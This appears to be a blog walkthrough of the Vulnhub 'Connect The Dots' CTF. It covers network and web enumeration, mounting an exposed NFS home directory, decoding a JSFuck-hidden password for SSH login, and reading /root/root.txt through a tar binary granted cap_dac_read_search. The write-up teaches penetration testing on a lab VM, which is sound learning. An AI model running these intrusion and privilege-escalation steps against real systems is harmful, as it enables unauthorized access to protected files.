---
layout: post
title: "Connect The Dots Walkthrough"
date: 2019-10-26
---

Connect The Dots is a CTF style challenge from Vulnhub created by Sumit Verma. This box main objective seems to be thorough enumeration, connecting various hints given throughout the process.
Although the difficulty level was listed as Beginner and Intermediate level, I would say it was closer to Intermediate.

**Vulnerable System**: Connect the Dots
=======================================

**Operating System**: Debian 10

**Kernel**: 4.19.0

**Due to this being a capture the flag (CTF) challenge, I will not be
summarizing vulnerabilities as I normally do.**

Methodology
-----------

-   Host Discovery (netdiscover)

-   Port Scanning (nmap)

-   Web Port Enumeration (nikto, gobuster, browser)

-   NFS Enumeration (showmount)

-   Low Privilege Exploitation (jsunfuck, ssh)

-   Privilege Escalation (getcap, tar)

Reconnaissance
--------------

### Host Discovery (Netdiscover)

```
lifesfun:~# netdiscover -r 192.168.211.0
Currently scanning: Finished! | Screen View: Unique Hosts
3 Captured ARP Req/Rep packets, from 3 hosts. Total size: 180
_____________________________________________________________________________
IP At MAC Address Count Len MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.211.1 00:50:56:c0:00:01 1 60 VMware, Inc.
192.168.211.139 00:0c:29:d3:a5:10 1 60 VMware, Inc.
192.168.211.254 00:50:56:f6:e4:6d 1 60 VMware, Inc.
```

### Port Scanning (nmap)

#### All Ports Scan.

```
lifesfun:~# nmap -p- 192.168.211.139
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-26 15:40 EDT
Nmap scan report for 192.168.211.139
Host is up (0.00072s latency).
Not shown: 65526 closed ports
PORT STATE SERVICE
21/tcp open ftp
80/tcp open http
111/tcp open rpcbind
2049/tcp open nfs
7822/tcp open unknown
33893/tcp open unknown
40871/tcp open unknown
53281/tcp open unknown
57879/tcp open unknown
MAC Address: 00:0C:29:D3:A5:10 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 15.12 seconds
```

#### Aggressive, Version and Default Script Scan.

```
lifesfun:~# nmap -A -sV -sC -p 21,80,111,2049,7822,33893,40871,53281,57879 192.168.211.139
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-26 15:42 EDT
Nmap scan report for 192.168.211.139
Host is up (0.00085s latency).
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 2.0.8 or later
80/tcp open http Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Landing Page
111/tcp open rpcbind 2-4 (RPC #100000)
| rpcinfo:
| program version port/proto service
| 100000 2,3,4 111/tcp rpcbind
| 100000 2,3,4 111/udp rpcbind
| 100000 3,4 111/tcp6 rpcbind
| 100000 3,4 111/udp6 rpcbind
| 100003 3 2049/udp nfs
| 100003 3 2049/udp6 nfs
| 100003 3,4 2049/tcp nfs
| 100003 3,4 2049/tcp6 nfs
| 100005 1,2,3 37513/udp mountd
| 100005 1,2,3 41086/udp6 mountd
| 100005 1,2,3 48455/tcp6 mountd
| 100005 1,2,3 53281/tcp mountd
| 100021 1,3,4 40871/tcp nlockmgr
| 100021 1,3,4 41419/tcp6 nlockmgr
| 100021 1,3,4 55663/udp6 nlockmgr
| 100021 1,3,4 60867/udp nlockmgr
| 100227 3 2049/tcp nfs_acl
| 100227 3 2049/tcp6 nfs_acl
| 100227 3 2049/udp nfs_acl
|_ 100227 3 2049/udp6 nfs_acl
2049/tcp open nfs_acl 3 (RPC #100227)
7822/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
| 2048 38:4f:e8:76:b4:b7:04:65:09:76:dd:23:4e:b5:69:ed (RSA)
| 256 ac:d2:a6:0f:4b:41:77:df:06:f0:11:d5:92:39:9f:eb (ECDSA)
|_ 256 93:f7:78:6f:cc:e8:d4:8d:75:4b:c2:bc:13:4b:f0:dd (ED25519)
33893/tcp open mountd 1-3 (RPC #100005)
40871/tcp open nlockmgr 1-4 (RPC #100021)
53281/tcp open mountd 1-3 (RPC #100005)
57879/tcp open mountd 1-3 (RPC #100005)
MAC Address: 00:0C:29:D3:A5:10 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Port Enumeration 

#### Web Application Vulnerability Scan (nikto)

```
lifesfun:~# nikto -h 192.168.211.139
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP: 192.168.211.139
+ Target Hostname: 192.168.211.139
+ Target Port: 80
+ Start Time: 2019-10-26 15:46:08 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Multiple index files found: /index.htm, /index.html
+ Server may leak inodes via ETags, header found with file /, inode: 7ac, size: 59494509b9f00, mtime: gzip
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
+ OSVDB-3092: /hits.txt: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time: 2019-10-26 15:46:42 (GMT-4) (34 seconds)
---------------------------------------------------------------------------
```

#### Bruteforcing Hidden Web Directories (gobuster) 

The first search yields an entry called /backups and the second search yields an
entry called /mysite

```
root@lifesfun:~# gobuster dir -u http://192.168.211.139 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@FireFart)
===============================================================
[+] Url: http://192.168.211.139
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/common.txt
[+] Status codes: 200,204,301,302,307,401,403
[+] User Agent: gobuster/3.0.1
[+] Timeout: 10s
===============================================================
2019/10/26 15:50:38 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/backups (Status: 200)
/images (Status: 301)
/index.htm (Status: 200)
/index.html (Status: 200)
/javascript (Status: 301)
/manual (Status: 301)
/server-status (Status: 403)
===============================================================
2019/10/26 15:50:39 Finished
===============================================================
```

directory-list-2.3-medium.txt wordlist

```
root@lifesfun:~/vulnhub/connect-the-dots# gobuster dir -u http://192.168.211.139 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@FireFart)
===============================================================
[+] Url: http://192.168.211.139
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes: 200,204,301,302,307,401,403
[+] User Agent: gobuster/3.0.1
[+] Timeout: 10s
===============================================================
2019/10/26 16:12:31 Starting gobuster
===============================================================
/images (Status: 301)
/manual (Status: 301)
/javascript (Status: 301)
/backups (Status: 200)
/mysite (Status: 301)
/server-status (Status: 403)
===============================================================
2019/10/26 16:13:02 Finished
===============================================================
```

#### Browser Reconnaissance

Home Page

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Connect%20The%20Dots/images/1a55580f10e43b099433dbc4aefe1aea.png?raw=true)

Home page gives us a hint about the usernames, one starts with M and one start
with N.

hits.txt file in the browser.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Connect%20The%20Dots/images/94e38706062d1b9a56eb9c75e93296eb.png?raw=true)

backups entry in the browser, turns out to be an mp4 file.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Connect%20The%20Dots/images/e48d275290bec03fe09c51dde7add43a.png?raw=true)

So far nothing too interesting.

Next, let’s check index.htm page (a second index page that was found by nikto
and gobuster).

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Connect%20The%20Dots/images/a4c58e2c2c4d2c92412d8aa0b2161aef.png?raw=true)

At first it looks pretty the same but looking at the source code there is
something interesting. It looks like another reference to /mysite folder, which
was also discovered by gobuster.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Connect%20The%20Dots/images/a1b3eee1f7206b59b64eba7d676cfc55.png?raw=true)

Going to the /mysite directory presents multiple files.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Connect%20The%20Dots/images/33d0a431be2b330d894d47af31db2aa0.png?raw=true)

Notice there are 2 files with similar name, bootstrap.min.cs and
boostrap.min.css. The .cs (c-sharp) file looks out of place, let's check its
contents.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Connect%20The%20Dots/images/a3a1ec9d7f2ddea6d448ab4313cf908d.png?raw=true)

It looks like some sort of code, before investigating it further let’s enumerate
NFS share.

Enumerating NFS Shares (showmount)
----------------------------------
```
root@lifesfun:~/vulnhub/connect-the-dots# showmount -e 192.168.211.139
Export list for 192.168.211.139:
/home/morris *
The showmount command gave us a clue to the first username - morris. As per the homepage of the webserver, the other username should be norris.
root@lifesfun:~/vulnhub/connect-the-dots# mkdir morris
root@lifesfun:~/vulnhub/connect-the-dots# mount -t nfs 192.168.211.139:/home/morris morris/
root@lifesfun:~/vulnhub/connect-the-dots# df -k
Filesystem 1K-blocks Used Available Use% Mounted on
udev 3285120 0 3285120 0% /dev
tmpfs 661648 10300 651348 2% /run
/dev/sda1 79981124 28781072 47094224 38% /
tmpfs 3308220 14032 3294188 1% /dev/shm
tmpfs 5120 0 5120 0% /run/lock
tmpfs 3308220 0 3308220 0% /sys/fs/cgroup
tmpfs 661644 12 661632 1% /run/user/133
tmpfs 661644 52 661592 1% /run/user/0
192.168.211.139:/home/morris 5610496 4009984 1295360 76% /root/vulnhub/connect-the-dots/morris
root@lifesfun:~/vulnhub/connect-the-dots# cd morris/
root@lifesfun:~/vulnhub/connect-the-dots/morris# ls
Templates
root@lifesfun:~/vulnhub/connect-the-dots/morris# cd Templates/
root@lifesfun:~/vulnhub/connect-the-dots/morris/Templates# ls
root@lifesfun:~/vulnhub/connect-the-dots/morris/Templates# ls -laht
total 8.0K
drwxr-xr-x 8 1000 1000 4.0K Oct 11 10:40 ..
drwxr-xr-x 2 1000 1000 4.0K Oct 10 17:44 .
root@lifesfun:~/vulnhub/connect-the-dots/morris/Templates# cd ..
root@lifesfun:~/vulnhub/connect-the-dots/morris# ls -laht
total 56K
drwxr-xr-x 4 root root 4.0K Oct 28 07:51 ..
-rw------- 1 1000 1000 1 Oct 11 11:09 .bash_history
drwxr-xr-x 8 1000 1000 4.0K Oct 11 10:40 .
-rw------- 1 1000 1000 1.9K Oct 11 10:40 .ICEauthority
drwx------ 10 1000 1000 4.0K Oct 11 10:09 .config
drwx------ 2 1000 1000 4.0K Oct 10 19:55 .ssh
-rw------- 1 1000 1000 52 Oct 10 17:58 .Xauthority
drwx------ 9 1000 1000 4.0K Oct 10 17:45 .cache
drwx------ 3 1000 1000 4.0K Oct 10 17:44 .gnupg
drwxr-xr-x 2 1000 1000 4.0K Oct 10 17:44 Templates
drwx------ 3 1000 1000 4.0K Oct 10 17:44 .local
-rw-r--r-- 1 1000 1000 220 Oct 10 17:38 .bash_logout
-rw-r--r-- 1 1000 1000 807 Oct 10 17:38 .profile
```

So far nothing useful has been found in Morris' directory. Let's move on back to the .cs file that was found earlier.


Low Privilege Exploitation
--------------------------

After doing some research, it's been concluded that the contents of
bootstrap.min.cs is javascript encoding called JSFUCK. Below is a website that
can decode the JSFUCK encoding. Once decoded it reveals the possible password
for user Norris.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Connect%20The%20Dots/images/6ace72f39e6ffc5ba27c846d986fb4d2.png?raw=true)

The possible password is TryToGuessThisNorris@2k19

### Initial Login and User Flag
```
root@lifesfun:~# ssh -p 7822 norris@192.168.211.139
norris@192.168.211.139's password:
Linux sirrom 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
###
# # # # ##### # ## ##### # # # ####
# ## # # # # # # # # ## # # #
# # # # # # # # # # # # # # #
# # # # # # # ###### # # # # # # ###
# # ## # # # # # # # # ## # #
### # # # # # # # # # # # ####
norris@sirrom:~$ ls
ftp user.txt
norris@sirrom:~$ cat user.txt
2c2836a138c0e7f7529aa0764a6414d0
```

Privilege Escalation
--------------------

Distro and Kernel Information.
```
norris@sirrom:/tmp$ uname -a && cat /etc/*-release
Linux sirrom 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```
Thanks to pwn4magic for showing me the method below.
getcap scans the system for files with special capabilities.
For more information visit: https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/

First set $PATH variable to the full path.
```
norris@sirrom:/tmp$ export PATH=$PATH:/usr/sbin:/usr/local/sbin:/usr/local/bin:/usr/bin:/sbin:/bin:/usr/games
```
Next scan the system for files with special capabilities.

```
norris@sirrom:/tmp$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/tar = cap_dac_read_search+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/ping = cap_net_raw+ep
norris@sirrom:/tmp$ ls -laht /usr/bin/tar
-r-xr-x--- 1 root norris 436K Apr 23 2019 /usr/bin/tar
```

### Root Flag

Looks like tar is one of those files, which let’s one get the root flag.

```
norris@sirrom:/tmp/etc$ /usr/bin/tar -cvf root_txt.tar /root/root.txt
/usr/bin/tar: Removing leading `/' from member names
/root/root.txt
norris@sirrom:/tmp/etc$ tar -xvf root_txt.tar
root/root.txt
norris@sirrom:/tmp/etc$ cat root/root.txt
8fc9376d961670ca10be270d52eda423
```
